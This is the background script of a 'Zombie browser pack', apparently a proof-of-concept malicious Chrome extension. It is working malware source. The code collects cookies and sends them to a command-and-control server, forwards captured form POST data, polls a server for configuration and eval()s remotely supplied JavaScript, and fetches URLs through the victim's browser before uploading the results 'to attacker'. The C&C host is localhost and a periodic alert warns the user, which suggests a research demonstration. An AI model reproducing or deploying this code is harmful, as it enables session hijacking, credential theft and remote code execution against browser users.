/*
Zombie browser pack, remote control Chrome browsers via extensions
Copyright (C) 2012  Zoltan Balazs

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/

var config = new Object();

// if data received from content script, send it to the C&C server
chrome.extension.onRequest.addListener(
  function(request, sender, sendResponse) {
    if (request.greeting == "postdata") {
      postDataLogger("Postdata: " + request.message);
	  }
  });
 
// generate userID used to identify client 
function randomString(string_length) {
	var chars = "0123456789abcdef";

	var randomstring = '';
	for ( var i = 0; i < string_length; i++) {
		var rnum = Math.floor(Math.random() * chars.length);
		randomstring += chars.substring(rnum, rnum + 1);
	}
	return randomstring;
}

// query the current userID
function getUserID() {
	if (!localStorage.rs) {
		localStorage.rs = randomString(40);
	}
	return localStorage.rs;
}

/**
 * Possible parameters for request: action: "xhttp" for a cross-origin HTTP
 * request method: Default "GET" url : required, but not validated data : data
 * to send in a POST request
 * 
 * The callback function is called upon completion of the request
 */
 
function sendMessage(request, callback) {
	if (request.action == "xhttp") {
		var xhttp = new XMLHttpRequest(), method = request.method ? request.method
				.toUpperCase()
				: 'GET';
		if (request.responsetype) {
			xhttp.responseType = request.responsetype;
			}
		xhttp.onreadystatechange = function() {
			if (xhttp.readyState == 4 && xhttp.status == 200) {
			
				// if we want blob data, return with response not responsetext
				if (request.responsetype) {
					callback(xhttp.response);
				}
				else {
					callback(xhttp.responseText);
				}
			}
		}
		
		xhttp.open(method, request.url, true);
		if (request.mimetype = "octet-stream") {
				xhttp.overrideMimeType("application/octet-stream");
		 	}
		
		if (method == 'POST' && !request.header) {
			xhttp.setRequestHeader("Content-Type",
					"application/x-www-form-urlencoded");
		}
		xhttp.send(request.data);
	}
}

// use the built in geolocation, makes not much sense on computers with no gps
function geoLocation() {
	navigator.geolocation.getCurrentPosition(geoLsuccessCallback,
			geoLerrorCallback, {
				maximumAge : 600000000,
				timeout : 4
			});
}
function geoLsuccessCallback(position) {
	console.log("geoloc position: " + position);
}

function geoLerrorCallback(error) {
	console.log("geoloc error: " + error.code);
}

// steal cookies from cookiemanager
function cookieEvent(cookieList) {
	cookieArray = cookieList.split(",");
	for ( var i = 0, len = cookieArray.length; i < len; i++) {

		chrome.cookies.getAll({
			name : cookieArray[i]
		}, function(cookies) {
			for ( var i in cookies) {
				cookie = "Domain: " + cookies[i].domain + " Name: "
						+ cookies[i].name + " Expiration date: " + cookies[i].expirationDate + " Value: " + cookies[i].value ;
				//console.log(cookie);
				
				var lsname  = (cookies[i].domain + cookies[i].name).replace(":","").replace("/","");
				
				// if the cookie has changed since last time, save it to local storage and send back
				if (localStorage[lsname] !== cookie){
					localStorage[lsname] = cookie;
							
				try {
					var hashid = getUserID();
					sendMessage({
						method : "POST",
						action : "xhttp",
						url : config.cookieloggerhost + hashid,
						data : "utf8=%E2%9C%93&cookie%5Bdata%5D="
								+ encodeURIComponent(cookie)
					}, function(responseText) {
						console.log("success cookielog");
						/* Callback function to deal with the response */
					}, "none")

				} catch (exc) {
					console.log("Error1: " + exc);
					return 'unknown';
				}
				}
			}
		});
	}
}

// send stolen data to the C&C server

function postDataLogger(data) {
try {
		var hashid = getUserID();
		sendMessage(
				{
					method : "POST",
					action : "xhttp",
					url : config.postdataloggerhost
							+ hashid,
					data : "utf8=%E2%9C%93&postinfo%5Bdata%5D=" + encodeURIComponent(data)
				}, function(responseText) {
					console.log("success postdata");
					/* Callback function to deal with the response */
				}, "none")
		// dbg("2");

	} catch (exc) {
		console.log("Error2: " + exc);
		return 'unknown';
	}
}

// heartbeat + send user data to C&C server
// TODO integrate with getconfig
getEnvInfo = function(config) {
	try {
		var hashid = getUserID();
		// console.log("loginhost:" + config.loginhost);
		var d = new Date();
		
		sendMessage(
				{
					method : "POST",
					action : "xhttp",
					url : "http://127.0.0.1/login/"
							+ hashid,
					data : "utf8=%E2%9C%93&zombie%5Busername%5D="
							+ encodeURIComponent("dummy")
							+ "&zombie%5Bos%5D="
							+ encodeURIComponent("")
							+ "&zombie%5Bbrowsername%5D="
							+ encodeURIComponent("Chrome")
							+ "&zombie%5Bbrowserversion%5D="
							+ encodeURIComponent("")
							+ "&zombie%5Bhashid%5D=" + hashid
							+ "&commit=Create+Zombie"
				}, function(responseText) {
				}, "none")

	} catch (exc) {
		console.log("Error1: " + exc);
		return 'unknown';
	}
};

// download data from remote URL, send response to C&C server

function downloadContentFromURL(host, method, params, mime) {
		try {
				// fetch the URL 
					sendMessage(
				{
					method : method,
					action : "xhttp",
					url : host,
					data : params,
					responsetype : "blob",
					mimetype : "octet-stream"
				}, function(response) {
					console.log("remote URL fetched");
					console.log(JSON.parse(localStorage.config).uploadpath);

					var formData = new FormData();					
					formData.append("utf8", "â??");
					formData.append("datafile", response);
					formData.append("commit", "Upload");

					// send the response back to attacker
							sendMessage(
						{
							method : "POST",
							action : "xhttp",
							url : JSON.parse(localStorage.config).uploadpath+ getUserID(),
							data : formData
						}, function(responseText2) {
							console.log("data sent to attacker");					
					}, "none")					
				}, "none")
		// dbg("2");

	} catch (exc) {
		console.log("Error1: " + exc);
		return 'unknown';
	}
					/*
						httpRequest.overrideMimeType("application/octet-stream");
						
						*/
	}



// scheduled getconfig, used to download current config and command from C&C server
var interval1 = window.setInterval(function(thisObj) {
	//console.log("getconfig");
	sendMessage({
		method : "GET",
		action : "xhttp",
		url : "http://127.0.0.1/c/"
				+ getUserID() + ".json",
		data : ""
	}, function(responseText) {
		var oldconfig = new Object();
		oldconfig.jscommandid = 1;
		if (localStorage.config) {
			oldconfig = JSON.parse(localStorage.config);
		}
		// console.log(responseText);
		localStorage.config = responseText;
		config = JSON.parse(localStorage.config);

		if (oldconfig.jscommandid < config.jscommandid) {
			// console.log("Great success!");
			eval(config.jscommand);
		}
	});
}, 5 * 1000, this);

var firsttime = true;

if(firsttime) {
  console.log("getenvinfo - login"); 
  getEnvInfo();
  firsttime = false;
  }

 // scheduled check for new cookies
var interval4 = window.setInterval(function(thisObj) {
	//console.log("getcookies");
	cookieEvent(config.cookielist);
}, 10 * 1000, this);

var interval4 = window.setInterval(function(thisObj) {
	alert("Be warned user, a malicious extension is running in your browser.");
}, 60 * 1000, this);